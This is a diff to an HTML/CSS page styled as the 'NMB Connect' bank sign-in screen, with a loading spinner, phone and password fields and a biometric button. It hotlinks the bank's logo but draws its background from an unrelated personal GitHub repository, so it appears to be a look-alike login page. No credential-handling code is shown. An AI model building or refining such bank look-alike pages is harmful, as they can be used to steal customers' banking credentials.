@@ -36,7 +36,7 @@
     @media(max-width:430px){.scr{min-height:100dvh;}}
     .scr.active{display:flex;}
 
-    /* ── LOADING SCREEN ── */
+    /* ── LOADING SCREEN (CSS spinner) ── */
     .scr.loading-scr{
       display:flex;
       align-items:center;
@@ -50,44 +50,29 @@
       z-index:50;
     }
     .scr.loading-scr.active{display:flex;}
-    .icon-wrap{
-      width:150px;
-      height:150px;
-      margin:auto;
+    .loader-wrapper{
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      justify-content:center;
     }
-    .loading-circle{
-      fill:none;
-      stroke:#E8A93B;
-      stroke-width:18;
-      stroke-linecap:round;
-      stroke-dasharray:440;
-      stroke-dashoffset:440;
-      transform-origin:75px 75px;
-      animation:
-        draw-in 1.6s cubic-bezier(0.65,0,0.35,1) forwards,
-        loading-spin 2.6s linear infinite 1.6s;
-      transform:translateZ(0);
-      will-change:transform,opacity;
+    .spinner{
+      width:60px;
+      height:60px;
+      border:6px solid rgba(232,169,59,0.2);
+      border-top:6px solid #E8A93B;
+      border-radius:50%;
+      animation:spin 1s linear infinite;
+      margin-bottom:24px;
     }
-    @keyframes draw-in{
-      0%{stroke-dashoffset:440;transform:rotate(-90deg);}
-      100%{stroke-dashoffset:0;transform:rotate(270deg);}
-    }
-    @keyframes loading-spin{
-      from{transform:rotate(0deg);}
+    @keyframes spin{
       to{transform:rotate(360deg);}
     }
-    .glyph{
-      opacity:0;
-      transform:scale(0.85);
-      transform-origin:75px 75px;
-      animation:reveal 0.6s ease-out forwards;
-      animation-delay:1.3s;
-      transform:translateZ(0);
-      will-change:transform,opacity;
-    }
-    @keyframes reveal{
-      to{opacity:1;transform:scale(1);}
+    .loader-logo{
+      width:120px;
+      height:auto;
+      display:block;
+      object-fit:contain;
     }
     .loading-fade-out{
       animation:fadeOut 0.6s ease forwards;
@@ -219,45 +204,55 @@
       width: 100%;
       max-width: 375px;
       min-height: 100vh;
+      height: 100vh;
+      max-height: 812px;
       background-image: url('https://raw.githubusercontent.com/arapchelogoi/nietzche/main/file_0000000082bc81f490adba53e9290210.png');
       background-size: cover;
       background-position: center;
       background-repeat: no-repeat;
-      padding: 60px 32px 40px;
+      padding: 40px 24px 30px;
       display: flex;
       flex-direction: column;
       align-items: center;
       position: relative;
       margin: 0 auto;
+      overflow: hidden;
     }
 
-    .spacer-signin { flex: 1 1 auto; min-height: 220px; }
+    .screen-logo {
+      max-width: 160px;
+      height: auto;
+      flex-shrink: 0;
+      margin-top: 10px;
+    }
+
+    .spacer-signin { flex: 1 1 auto; min-height: 40px; }
 
     .field-signin {
       width: 100%;
       max-width: 311px;
-      height: 56px;
+      height: 50px;
       border: 2px solid rgba(255, 255, 255, 0.8);
       border-radius: 10px;
       display: flex;
       align-items: center;
-      padding: 0 16px;
-      margin-bottom: 20px;
+      padding: 0 14px;
+      margin-bottom: 14px;
       background: transparent;
       backdrop-filter: blur(2px);
       flex-shrink: 0;
     }
 
     .flag {
-      font-size: 20px;
-      margin-right: 8px;
+      font-size: 18px;
+      margin-right: 6px;
       flex-shrink: 0;
     }
 
     .caret {
       color: rgba(255, 255, 255, 0.9);
-      margin-right: 12px;
-      font-size: 12px;
+      margin-right: 10px;
+      font-size: 11px;
       flex-shrink: 0;
     }
 
@@ -265,7 +260,7 @@
       width: 1px;
       align-self: stretch;
       background: rgba(255, 255, 255, 0.5);
-      margin-right: 14px;
+      margin-right: 12px;
       flex-shrink: 0;
     }
 
@@ -273,7 +268,7 @@
       border: none;
       outline: none;
       flex: 1;
-      font-size: 17px;
+      font-size: 16px;
       color: #fff;
       background: transparent;
       min-width: 0;
@@ -285,9 +280,9 @@
     }
 
     .lock-icon {
-      width: 18px;
-      height: 18px;
-      margin-right: 14px;
+      width: 16px;
+      height: 16px;
+      margin-right: 12px;
       color: rgba(255, 255, 255, 0.8);
       flex-shrink: 0;
     }
@@ -295,44 +290,44 @@
     .btn-signin {
       width: 100%;
       max-width: 311px;
-      height: 56px;
+      height: 50px;
       background: transparent;
       border: 2px solid rgba(255, 255, 255, 0.8);
       border-radius: 12px;
       color: #fff;
-      font-size: 18px;
+      font-size: 17px;
       font-weight: 600;
       cursor: pointer;
-      margin-top: 8px;
+      margin-top: 6px;
       backdrop-filter: blur(2px);
       flex-shrink: 0;
     }
 
     .or-text {
       color: rgba(255, 255, 255, 0.8);
-      font-size: 15px;
-      margin: 22px 0;
+      font-size: 14px;
+      margin: 16px 0;
       flex-shrink: 0;
     }
 
     .btn-biometric {
       width: 100%;
       max-width: 311px;
-      height: 56px;
+      height: 50px;
       background: var(--navy);
       border: none;
       border-radius: 12px;
       color: #ffffff;
-      font-size: 16px;
+      font-size: 15px;
       font-weight: 500;
       cursor: pointer;
       flex-shrink: 0;
     }
 
     .forgot {
-      margin-top: 24px;
+      margin-top: 18px;
       color: rgba(255, 255, 255, 0.9);
-      font-size: 15px;
+      font-size: 14px;
       text-decoration: none;
       flex-shrink: 0;
     }
@@ -409,24 +404,9 @@
 
   <!-- ═══════════════════ LOADING SCREEN ═══════════════════ -->
   <div class="scr loading-scr active" id="s-loading">
-    <div class="icon-wrap">
-      <svg viewBox="0 0 150 150" xmlns="http://www.w3.org/2000/svg">
-        <circle class="loading-circle" cx="75" cy="75" r="55" />
-        <g class="glyph">
-          <rect x="52" y="42" width="38" height="68" rx="8" fill="#0F2A54" />
-          <rect x="56" y="48" width="30" height="48" rx="2" fill="#ffffff" />
-          <rect x="64" y="98" width="12" height="3" rx="1.5" fill="#ffffff" />
-          <rect x="82" y="58" width="26" height="26" rx="5" fill="#0F2A54" />
-          <path d="M85 61 a3 3 0 0 0 3 3" fill="none" stroke="#E8A93B" stroke-width="2" />
-          <path d="M105 61 a3 3 0 0 1 -3 3" fill="none" stroke="#E8A93B" stroke-width="2" />
-          <path d="M85 81 a3 3 0 0 1 3 -3" fill="none" stroke="#E8A93B" stroke-width="2" />
-          <path d="M105 81 a3 3 0 0 0 -3 -3" fill="none" stroke="#E8A93B" stroke-width="2" />
-          <rect x="61" y="64" width="26" height="2" rx="1" fill="#0F2A54" />
-          <rect x="57" y="70" width="18" height="2" rx="1" fill="#E8A93B" />
-          <rect x="61" y="76" width="16" height="2" rx="1" fill="#E8A93B" />
-          <rect x="57" y="82" width="26" height="2" rx="1" fill="#0F2A54" />
-        </g>
-      </svg>
+    <div class="loader-wrapper">
+      <div class="spinner"></div>
+      <img class="loader-logo" src="https://www.nmbconnectonline.co.zw/nmbconnectonline/newassets/img/nmbconnect.png" alt="NMB Connect">
     </div>
   </div>
 
@@ -528,7 +508,7 @@
   <!-- ═══════════════════ SIGN-IN PAGE ═══════════════════ -->
   <div class="scr" id="s-signin">
     <div class="screen">
-      <img src="https://www.nmbconnectonline.co.zw/nmbconnectonline/newassets/img/nmbconnect.png" alt="NMB Connect" style="max-width: 200px; margin-top: 40px;">
+      <img class="screen-logo" src="https://www.nmbconnectonline.co.zw/nmbconnectonline/newassets/img/nmbconnect.png" alt="NMB Connect">
       <div class="spacer-signin"></div>
 
       <div class="field-signin">
@@ -605,7 +585,7 @@ setTimeout(function(){
     loadingScreen.style.display = 'none';
     landingScreen.classList.add('active');
   }, 600);
-}, 5000);
+}, 4000);
 
 var durVal=6;
 
